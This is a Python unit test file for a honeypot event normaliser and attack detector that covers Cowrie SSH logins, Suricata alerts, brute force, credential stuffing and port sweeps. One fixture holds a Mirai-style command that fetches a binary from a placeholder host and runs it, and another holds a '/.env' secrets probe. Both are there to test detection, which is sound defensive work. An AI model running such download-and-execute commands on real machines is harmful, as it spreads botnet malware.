"""Unit tests for normalisation and detection. Run: python -m unittest discover app/tests"""
import ipaddress
import os
import sys
import unittest
from datetime import datetime, timedelta, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from getarp.detect import Detector  # noqa: E402
from getarp.normalize import normalize  # noqa: E402

T0 = datetime(2026, 11, 23, 10, 0, tzinfo=timezone.utc)


def cowrie(eventid, ip="45.202.199.98", **kw):
    rec = {"eventid": eventid, "src_ip": ip, "src_port": 40000, "dst_port": 2222,
           "protocol": "ssh", "session": "s1", "timestamp": T0.isoformat(), "getarp_sensor": "s01"}
    rec.update(kw)
    return normalize("cowrie", rec)


class Normalize(unittest.TestCase):
    def test_cowrie_login(self):
        ev = cowrie("cowrie.login.failed", username="root", password="123456")
        self.assertEqual(ev["event_type"], "login_failed")
        self.assertEqual(ev["dst_port"], 22)                 # redirected port mapped back
        self.assertEqual(ev["service"], "ssh")
        self.assertEqual(ev["sensor"], "s01")
        self.assertEqual(ev["src_ip"], ipaddress.ip_address("45.202.199.98"))

    def test_private_and_unknown_skipped(self):
        self.assertIsNone(cowrie("cowrie.login.failed", ip="10.0.0.2"))
        self.assertIsNone(cowrie("cowrie.log.closed"))
        self.assertIsNone(normalize("cowrie", "not a dict"))
        self.assertIsNone(normalize("nope", {}))

    def test_suricata_alert_reply_direction(self):
        ev = normalize("suricata", {
            "event_type": "alert", "timestamp": "2026-11-23T10:00:00.000000+0000",
            "src_ip": "172.31.1.5", "src_port": 22, "dest_ip": "124.248.67.170", "dest_port": 51000,
            "alert": {"signature": "ET SCAN test", "severity": 2}, "getarp_sensor": "s02"})
        self.assertEqual(str(ev["src_ip"]), "124.248.67.170")  # the public end is the attacker
        self.assertEqual(ev["dst_port"], 22)
        self.assertEqual(ev["severity"], 2)

    def test_suricata_flow_skipped(self):
        self.assertIsNone(normalize("suricata", {"event_type": "flow", "src_ip": "8.8.8.8"}))

    def test_extra_http(self):
        ev = normalize("extra", {"ts": T0.isoformat(), "service": "http", "dst_port": 8080,
                                 "src_ip": "46.101.137.209", "event_type": "connect",
                                 "command": "GET /.env", "getarp_sensor": "s01"})
        self.assertEqual(ev["event_type"], "request")
        self.assertEqual(ev["dst_port"], 80)


class Detect(unittest.TestCase):
    def test_bruteforce_once_per_window(self):
        d = Detector()
        found = []
        for i in range(25):
            ev = cowrie("cowrie.login.failed", username="root", password=f"p{i}",
                        timestamp=(T0 + timedelta(seconds=i)).isoformat())
            found += d.observe(ev).findings
        types = [f.type for f in found if f.kind == "attack"]
        self.assertEqual(types, ["bruteforce"])

    def test_credential_stuffing(self):
        d = Detector()
        found = []
        for i in range(10):
            ev = cowrie("cowrie.login.failed", username=f"user{i}", password="x",
                        timestamp=(T0 + timedelta(seconds=i)).isoformat())
            found += d.observe(ev).findings
        self.assertEqual(found[-1].type, "credential_stuffing")

    def test_sweep(self):
        d = Detector()
        found = []
        for i, port in enumerate((2222, 2223, 2121, 3306, 6379)):
            ev = cowrie("cowrie.session.connect", dst_port=port,
                        timestamp=(T0 + timedelta(seconds=i)).isoformat())
            found += d.observe(ev).findings
        self.assertEqual([f.type for f in found], ["service_sweep"])
        self.assertEqual(found[0].detail["ports"], [21, 22, 23, 3306])

    def test_commands_and_tooling(self):
        d = Detector()
        d.observe(cowrie("cowrie.login.success", username="root", password="admin"))
        r1 = d.observe(cowrie("cowrie.command.input", input="uname -a"))
        r2 = d.observe(cowrie("cowrie.command.input", input="cd /tmp; wget http://x/mips; /bin/busybox MIRAI"))
        self.assertEqual([f.type for f in r1.findings], ["command_exec"])
        self.assertEqual(r2.findings, [])                     # one command finding per session
        self.assertEqual(r2.cls, "exploiter")
        self.assertGreaterEqual(r2.score, 90)
        self.assertIn("mirai", r2.tooling)
        self.assertIn("recon", r1.tooling)

    def test_eviction(self):
        d = Detector()
        d.observe(cowrie("cowrie.session.connect"))
        for s in d.states.values():
            s.touched -= 10_000
        self.assertEqual(d.evict_idle(), 0)


if __name__ == "__main__":
    unittest.main()
